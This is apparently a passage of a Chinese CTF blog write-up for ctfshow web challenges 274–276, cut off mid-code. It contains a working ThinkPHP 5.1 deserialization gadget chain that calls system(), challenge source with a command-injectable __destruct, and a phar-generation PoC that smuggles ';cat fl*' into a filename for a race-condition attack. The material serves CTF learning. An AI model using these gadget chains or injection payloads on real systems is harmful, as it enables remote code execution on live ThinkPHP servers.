src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617629565347-7bf6ef81-cfd7-45b4-a599-27efeea51f2a.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617629565347-7bf6ef81-cfd7-45b4-a599-27efeea51f2a.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="web274-thinkphp5-1"><a href="#web274-thinkphp5-1" class="headerlink" title="web274 thinkphp5.1"></a>web274 thinkphp5.1</h2><span class='btn'><a class="button"  title='nginx/1.16.1'><i class='fas fa-tag'></i>nginx/1.16.1</a></span> <span class='btn'><a class="button"  title='PHP/7.3.11'><i class='fas fa-tag'></i>PHP/7.3.11</a></span> <span class='btn'><a class="button"  title='框架审计'><i class='fas fa-tag'></i>框架审计</a></span> <span class='btn'><a class="button"  title='thinkphp5.1'><i class='fas fa-tag'></i>thinkphp5.1</a></span><p>thinkphp 5.1反序列化漏洞</p><p>参考文章：<a href="https://xz.aliyun.com/t/6619">https://xz.aliyun.com/t/6619</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append = [<span class="string">&quot;lin&quot;</span>=&gt;[<span class="string">&quot;calc.exe&quot;</span>,<span class="string">&quot;calc&quot;</span>]];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = [<span class="string">&quot;lin&quot;</span>=&gt;<span class="keyword">new</span> Request()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$hook</span> = [];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filter</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$config</span> = [</span><br><span class="line">        <span class="comment">// 表单ajax伪装变量</span></span><br><span class="line">        <span class="string">&#x27;var_ajax&#x27;</span>         =&gt; <span class="string">&#x27;_ajax&#x27;</span>,  </span><br><span class="line">    ];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filter = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;config = [<span class="string">&quot;var_ajax&quot;</span>=&gt;<span class="string">&#x27;lin&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hook = [<span class="string">&quot;visible&quot;</span>=&gt;[<span class="keyword">$this</span>,<span class="string">&quot;isAjax&quot;</span>]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files=[<span class="keyword">new</span> Pivot()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Windows()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>数据接收方式</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617629667117-4e40ccfe-f0e0-4453-9eac-b68faa387554.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617629667117-4e40ccfe-f0e0-4453-9eac-b68faa387554.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>有空会（咕咕预订…）额外写文章复现 （</p><p>poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append = [<span class="string">&quot;lin&quot;</span>=&gt;[<span class="string">&quot;calc.exe&quot;</span>,<span class="string">&quot;calc&quot;</span>]];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = [<span class="string">&quot;lin&quot;</span>=&gt;<span class="keyword">new</span> Request()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$hook</span> = [];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filter</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$config</span> = [</span><br><span class="line">        <span class="comment">// 表单ajax伪装变量</span></span><br><span class="line">        <span class="string">&#x27;var_ajax&#x27;</span>         =&gt; <span class="string">&#x27;_ajax&#x27;</span>,  </span><br><span class="line">    ];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filter = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;config = [<span class="string">&quot;var_ajax&quot;</span>=&gt;<span class="string">&#x27;lin&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hook = [<span class="string">&quot;visible&quot;</span>=&gt;[<span class="keyword">$this</span>,<span class="string">&quot;isAjax&quot;</span>]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files=[<span class="keyword">new</span> Pivot()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Windows()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617629772399-69dfd9ce-fca2-433b-babd-40ed2cceb86a.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617629772399-69dfd9ce-fca2-433b-babd-40ed2cceb86a.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="web275-命令执行拼接"><a href="#web275-命令执行拼接" class="headerlink" title="web275 命令执行拼接"></a>web275 命令执行拼接</h2><span class='btn'><a class="button"  title='PHP/7.3.11'><i class='fas fa-tag'></i>PHP/7.3.11</a></span> <span class='btn'><a class="button"  title='nginx/1.16.1'><i class='fas fa-tag'></i>nginx/1.16.1</a></span><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-08 19:13:36</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-08 20:08:07</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">filter</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filecontent</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$evilfile</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$fn</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename=<span class="variable">$f</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filecontent=<span class="variable">$fn</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkevil</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/php|\.\./i&#x27;</span>, <span class="keyword">$this</span>-&gt;filename))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="keyword">$this</span>-&gt;filecontent))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;evilfile;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;evilfile)&#123;</span><br><span class="line">            system(<span class="string">&#x27;rm &#x27;</span>.<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$content</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    <span class="variable">$f</span> = <span class="keyword">new</span> filter(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],<span class="variable">$content</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$f</span>-&gt;checkevil()===<span class="literal">false</span>)&#123;</span><br><span class="line">        file_put_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line">        copy(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],md5(mt_rand()).<span class="string">&#x27;.txt&#x27;</span>);</span><br><span class="line">        unlink(<span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>].<span class="string">&#x27;/&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;work done&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;where is flag?&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">where is flag?</span><br></pre></td></tr></table></figure><p>分析：</p><p>看似花里胡哨，其实 <code>__destruct</code> 里的 <code>system</code> 可直接拼接，也就是设法让 <code>$this-&gt;evilfile</code> 置为 <code>true</code> ，然后拼接命令即可。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617632875169-378dcce8-4e3b-46a6-aa15-5834a078e4a2.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617632875169-378dcce8-4e3b-46a6-aa15-5834a078e4a2.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>题外：第一眼看去这一读一写，长的这么想被我条件竞争的样子 （</p><h2 id="web276-phar反序列化-条件竞争"><a href="#web276-phar反序列化-条件竞争" class="headerlink" title="web276 phar反序列化 条件竞争"></a>web276 phar反序列化 条件竞争</h2><span class='btn'><a class="button"  title='nginx/1.16.1'><i class='fas fa-tag'></i>nginx/1.16.1</a></span> <span class='btn'><a class="button"  title='PHP/7.3.11'><i class='fas fa-tag'></i>PHP/7.3.11</a></span> <span class='btn'><a class="button"  title='phar反序列化'><i class='fas fa-tag'></i>phar反序列化</a></span> <span class='btn'><a class="button"  title='条件竞争'><i class='fas fa-tag'></i>条件竞争</a></span><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-08 19:13:36</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-08 20:08:07</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">filter</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filecontent</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$evilfile</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$admin</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$fn</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename=<span class="variable">$f</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filecontent=<span class="variable">$fn</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkevil</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/php|\.\./i&#x27;</span>, <span class="keyword">$this</span>-&gt;filename))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="keyword">$this</span>-&gt;filecontent))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;evilfile;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;evilfile &amp;&amp; <span class="keyword">$this</span>-&gt;admin)&#123;</span><br><span class="line">            system(<span class="string">&#x27;rm &#x27;</span>.<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$content</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    <span class="variable">$f</span> = <span class="keyword">new</span> filter(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],<span class="variable">$content</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$f</span>-&gt;checkevil()===<span class="literal">false</span>)&#123;</span><br><span class="line">        file_put_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line">        copy(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],md5(mt_rand()).<span class="string">&#x27;.txt&#x27;</span>);</span><br><span class="line">        unlink(<span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>].<span class="string">&#x27;/&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;work done&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;where is flag?&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">where is flag?</span><br></pre></td></tr></table></figure><p>分析：</p><p>emm，在上题基础上新增了个判断 <code>$this-&gt;admin</code> 然后想着，构造一下序列化不就行了嘛，然后发现没有反序列化函数。。</p><p>看了下发现可以通过 <code>file_put_contents</code> 写 phar文件，然后题目中 <code>file_put_contents</code> 第一个参数可控，那么我们可以使用 <code>phar://</code>  协议，通过 <code>$content</code> 传入 phar 数据，这样在 PHP 通过 <code>phar://</code>  协议解析数据时，会将 <code>meta-data</code> 部分进行反序列化。</p><p>不过题目会删除文件，所以需要在删除文件前执行文件进行以上操作，因此要用到条件竞争，即生成了 phar 文件，在极短时间内文件是存在的，因为执行到 <code>unlink</code> 函数前还有一个 <code>copy</code> 文件操作，磁盘 io 是需要一定时间的。只要我们不断在写入 phar 文件，那么这个文件就可以断断续续访问到~</p><p>poc</p><p>phar构造如下，会在当前目录生成 <code>evil.phar</code> 文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">filter</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&#x27;;cat fl*&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$evilfile</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$admin</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 后缀必须为phar</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;evil.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="comment">// 设置 stubb, 增加 gif 文件头</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> filter();</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将自定义的 meta-data 存入 manifest</span></span><br><span class="line"><span class="comment"> * 这个函数需要在php.ini中修改 phar.readonly 为 Off</span></span><br><span 